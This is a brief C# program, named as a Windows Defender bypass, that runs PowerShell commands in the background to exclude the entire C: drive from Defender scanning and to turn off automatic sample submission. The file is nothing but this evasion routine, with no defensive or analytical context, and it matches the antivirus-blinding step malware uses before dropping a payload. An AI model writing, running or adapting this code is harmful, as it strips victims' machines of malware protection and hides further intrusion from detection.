using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinDefender_Bypass
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            //add C:\
            Task.Run(() =>
            {
                PowerShell.SendCommand(@"add-mppreference -ExclusionPath С:\");
            });
            //disable share protect
            Task.Run(() =>
            {
                PowerShell.SendCommand(@"Set-MpPreference -SubmitSamplesConsent 2");
            });
        }
    }
}
